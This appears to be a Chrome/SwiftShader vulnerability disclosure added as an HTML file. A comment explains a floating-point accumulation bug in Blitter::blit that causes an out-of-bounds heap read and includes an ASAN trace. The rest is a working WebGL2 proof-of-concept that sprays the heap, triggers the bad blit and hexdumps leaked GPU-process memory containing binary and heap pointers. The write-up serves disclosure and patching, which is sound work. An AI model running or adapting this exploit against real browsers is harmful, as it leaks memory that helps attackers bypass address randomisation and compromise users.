@@ -1,0 +1,279 @@
+<!--
+There is a bug in the Swiftshader renderer handling blitting between surfaces (Renderer/Blitter.cpp).
+
+For simplicity's sake, we'll consider the case when JITting fails (so ignoring the call to blitReactor) - in practice, the JITted code has the same problem, but it's somewhat more difficult to understand/explain that code.
+
+void Blitter::blit(Surface *source, const SliceRectF &sourceRect, Surface *dest, const SliceRect &destRect, const Blitter::Options& options)
+{
+  if(dest->getInternalFormat() == FORMAT_NULL)
+  {
+    return;
+  }
+
+  if(blitReactor(source, sourceRect, dest, destRect, options))
+  {
+    return;
+  }
+
+  SliceRectF sRect = sourceRect;
+  SliceRect dRect = destRect;
+
+  bool flipX = destRect.x0 > destRect.x1;
+  bool flipY = destRect.y0 > destRect.y1;
+
+  if(flipX)
+  {
+    swap(dRect.x0, dRect.x1);
+    swap(sRect.x0, sRect.x1);
+  }
+  if(flipY)
+  {
+    swap(dRect.y0, dRect.y1);
+    swap(sRect.y0, sRect.y1);
+  }
+
+  source->lockInternal((int)sRect.x0, (int)sRect.y0, sRect.slice, sw::LOCK_READONLY, sw::PUBLIC);
+  dest->lockInternal(dRect.x0, dRect.y0, dRect.slice, sw::LOCK_WRITEONLY, sw::PUBLIC);
+
+  float w = sRect.width() / dRect.width();
+  float h = sRect.height() / dRect.height();
+
+  const float xStart = sRect.x0 + 0.5f * w;
+  float y = sRect.y0 + 0.5f * h;
+  float x = xStart;
+
+  for(int j = dRect.y0; j < dRect.y1; j++)
+  {
+    x = xStart;
+
+    for(int i = dRect.x0; i < dRect.x1; i++)
+    {
+      // FIXME: Support RGBA mask
+      dest->copyInternal(source, i, j, x, y, options.filter);
+
+      x += w;
+    }
+
+    y += h;
+  }
+
+  source->unlockInternal();
+  dest->unlockInternal();
+}
+
+For context, dest->copyInternal will simply cast x and y to type int, and use them to read the colour at (x, y) from the source surface, then write it to (i, j) in the destination surface. No further bounds checking is performed in this function, since the inputs to it should previously have been checked.
+
+In every calling path, we should have also previously checked that sourceRect and destRect are within the bounds oftheir respective surfaces, so all of these accesses should be safe.
+
+If we look at the method of calculation for w and x however, we can see a potential problem.
+
+float w = sRect.width() / dRect.width();
+
+...
+for(int j = dRect.y0; j < dRect.y1; j++)
+{
+  x = xStart;
+
+  for(int i = dRect.x0; i < dRect.x1; i++)
+  {
+    ...
+
+    x += w;
+  }
+
+...
+
+
+We're performing repeated additions of floating point values, and in this case the attacker has sufficient control over the input values to arrange matters so that this has interesting results. The example used in the PoC is when the source width is 5828, and the destination width is 8132. Below shows the results of the calculation performed in the code, and a second calculation where a multiplication is used instead of the iterative addition:
+
+0:    1.075012 1.075012
+1:    1.791687 1.791687
+...
+1000: 717.749878 717.749878   Up to here the precision used the values are still identical
+1001: 718.466553 718.466553
+...
+2046: 1467.391724 1467.391724 At this point, the first significant errors start to occur, but note
+2047: 1468.108398 1468.108521 that the "incorrect" result is smaller than the more precise one.
+...
+2856: 2047.898315 2047.898438
+2857: 2048.614990 2048.614990 Here our two computations coincide again, briefly, and from here onwards
+2858: 2049.331787 2049.331787 the precision errors consistently favour a larger result than the more
+2859: 2050.048584 2050.048340 precise calculation.
+...
+8129: 5827.567871 5826.924805
+8130: 5828.284668 5827.641602
+8131: 5829.001465 5828.358398 The last index is now sufficiently different that int conversion results in an oob index.
+
+The result here is that we end up taking our sample values for the last row of the result from one-row-past-the-end of the source buffer.
+
+If we build with ASAN and disable the JIT by commenting out the blitReactor call, we can see this from the ASAN report:
+
+=================================================================
+==26029==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f808f3c205c at pc 0x7f809fdfcd34 bp 0x7fff0b816250 sp 0x7fff0b816248
+READ of size 4 at 0x7f808f3c205c thread T0 (chrome)
+==26029==WARNING: invalid path to external symbolizer!
+==26029==WARNING: Failed to use and restart external symbolizer!
+    #0 0x7f809fdfcd33 in sw::Surface::Buffer::read(void*) const /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/Renderer/Surface.cpp:580:25
+    #1 0x7f809fdc088a in sw::Blitter::blit(sw::Surface*, sw::SliceRectT<float> const&, sw::Surface*, sw::SliceRectT<int> const&, sw::Blitter::Options const&) /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/Renderer/Blitter.cpp:187:11
+
+0x7f808f3c205c is located 0 bytes to the right of 135862364-byte region [0x7f8087230800,0x7f808f3c205c)
+allocated by thread T0 (chrome) here:
+    #0 0x55f41d3e45c2 in operator new[](unsigned long) _asan_rtl_:3
+    #1 0x7f809ff6b82a in allocateRaw /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/Common/Memory.cpp:68:25
+    #2 0x7f809ff6b82a in sw::allocate(unsigned long, unsigned long) /ssd/chrome/src/out/asan/../../third_party/swiftshader/src/Common/Memory.cpp:85:0
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow (/ssd/chrome/src/out/asan/swiftshader/libGLESv2.so+0x4ddd33)
+Shadow bytes around the buggy address:
+  0x0ff091e703b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ff091e703c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ff091e703d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ff091e703e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ff091e703f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x0ff091e70400: 00 00 00 00 00 00 00 00 00 00 00[04]fa fa fa fa
+  0x0ff091e70410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0ff091e70420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0ff091e70430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0ff091e70440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0ff091e70450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==26029==ABORTING
+
+The bug is however also present in the JIT version of the function, and the attached PoC when run on a normal chrome build (with --disable-gpu, or forcing swiftshader as per my previously reported issue) should output leaked memory from the gpu process to the console. The very rough heap-spray implemented makes it likely the leaked memory will contain pointers to the chrome binary, to libswiftshader, and to the heap.
+-->
+
+<html>
+  <head>
+  </head>
+  <body onload="start()">
+    <canvas id='gl' width='128' height='128' />
+    <script>
+function hex(value, count) {
+  const alphabet = '0123456789abcdef';
+  var result = '';
+  for (var i = (count / 4) - 1; i >= 0; --i) {
+    result += alphabet[(value >> (i * 4)) & 0xf];
+  }
+  return result;
+}
+
+function interesting_line(view, i) {
+  for (var j = 0; j < 16; ++j) {
+    if (view.getUint8(i + j) != 0) {
+      return true;
+    }
+  }
+  return false;
+}
+
+function hexdump(view) {
+  output = '';
+  for (var i = 0; i < view.byteLength; i += 16) {
+    if (interesting_line(view, i)) {
+      output += hex(i, 16) + ':  ';
+      ascii = '';
+      for (var j = 0; j < 16; ++j) {
+        if (i + j < view.byteLength) {
+          byte = view.getUint8(i + j);
+          output += hex(byte, 8) + ' ';
+          if (0x20 <= byte && byte <= 0x7e) {
+            ascii += String.fromCharCode(byte);
+          } else {
+            ascii += '.';
+          }
+        } else {
+          output += '   ';
+        }
+      }
+
+      output += ' ' + ascii + '\n';
+    }
+  }
+
+  return output;
+}
+
+function web(gl) {
+  const width = 8192;
+
+  const src_height = 5828;
+  const dst_height = 8132;
+
+  var src_fb = gl.createFramebuffer();
+  gl.bindFramebuffer(gl.READ_FRAMEBUFFER, src_fb);
+  src_fb.width = width;
+  src_fb.height = src_height;
+
+  var src_data = new Uint8Array(width * src_height * 16);
+  for (var i = 0; i < src_data.length; ++i) {
+    src_data[i] = 0x23;
+  }
+
+  src_tex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_2D, src_tex);
+  gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, src_fb.width, src_fb.height, 0, gl.RGBA, gl.UNSIGNED_BYTE, src_data);
+  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+  gl.framebufferTexture2D(gl.READ_FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, src_tex, 0);
+
+  var dst_fb = gl.createFramebuffer();
+  gl.bindFramebuffer(gl.DRAW_FRAMEBUFFER, dst_fb);
+  dst_fb.width = width;
+  dst_fb.height = dst_height;
+
+  var dst_rb = gl.createRenderbuffer();
+  gl.bindRenderbuffer(gl.RENDERBUFFER, dst_rb);
+  gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA8, dst_fb.width, dst_fb.height);
+  gl.framebufferRenderbuffer(gl.DRAW_FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, dst_rb);
+
+  spray_data = new Uint8Array(8 * 8 * 4);
+  for (var i = 0; i < 8 * 8; ++i) {
+    spray_data[i] = 0x41;
+  }
+
+  for (var i = 0; i < 1024; ++i) {
+    spray_tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, spray_tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 8, 8, 0, gl.RGBA, gl.UNSIGNED_BYTE, spray_data);
+  }
+
+  gl.blitFramebuffer(0, 0, width, src_height,
+                     0, 0, width, dst_height,
+                     gl.COLOR_BUFFER_BIT, gl.NEAREST);
+
+  gl.bindFramebuffer(gl.READ_FRAMEBUFFER, dst_fb);
+
+  var dst_data = new Uint8Array(width * 4);
+  gl.readPixels(0, dst_height - 1, width, 1, gl.RGBA, gl.UNSIGNED_BYTE, dst_data);
+
+  console.log(hexdump(new DataView(dst_data.buffer)));
+}
+
+function start() {
+  var canvas = document.getElementById('gl');
+  var gl = canvas.getContext('webgl2');
+
+  if (gl) {
+    web(gl);
+  }
+}
+    </script>
+  </body>
+</html>
